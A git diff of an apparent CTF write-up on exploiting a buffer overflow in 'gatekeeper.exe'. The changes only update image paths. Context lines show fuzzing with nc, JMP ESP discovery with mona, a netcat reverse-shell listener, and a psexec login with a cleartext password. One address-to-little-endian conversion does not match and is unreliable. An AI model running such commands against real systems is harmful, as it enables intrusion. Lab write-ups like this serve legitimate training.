@@ -48,7 +48,7 @@ smb: \Share\> get gatekeeper.exe
 
 <figure><img src="../../.gitbook/assets/image (65) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (73) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Initial Shell
 
@@ -61,7 +61,7 @@ xfreerdp /u:admin /p:password /cert:ignore /v:$TESTMACHINE /workarea  +clipboard
 python2 -m SimpleHTTPServer 81
 ```
 
-![](<../../.gitbook/assets/image (68).png>)
+![](<../../.gitbook/assets/image (68) (1).png>)
 
 ### **Crash Replication & Controlling EIP**
 
@@ -72,7 +72,7 @@ python -c 'print("A"* 1000)'
 nc -v $TESTMACHINE 31337
 ```
 
-<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (72) (1).png" alt=""><figcaption></figcaption></figure>
 
 **fuzzer.py**
 
@@ -162,7 +162,7 @@ python exploit.py $VICTIM 1337
 
 
 
-<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (70) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Finding Bad Characters
 
@@ -228,7 +228,7 @@ except:
 
 
 
-<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (71) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
 
@@ -242,7 +242,7 @@ Now we need to find a place to jump to to run our payload.  We find there is onl
 !mona modules
 ```
 
-<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (67) (1).png" alt=""><figcaption></figcaption></figure>
 
 We find that gatekeeper.exe has 2 possible JMP ESPs to use. So we will start with the first one which is 0x080414c3 but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.
 
@@ -332,7 +332,7 @@ nc -lvnp 4444
 python exploit.py $TESTMACHINE 31337
 ```
 
-<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (74) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploit - Production
 
@@ -528,5 +528,5 @@ python3.9 /opt/impacket/build/scripts-3.9/psexec.py mayor@$VICTIM
 Password: 8CL7O1N78MdrCIsV
 ```
 
-<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (69) (1).png" alt=""><figcaption></figcaption></figure>
 
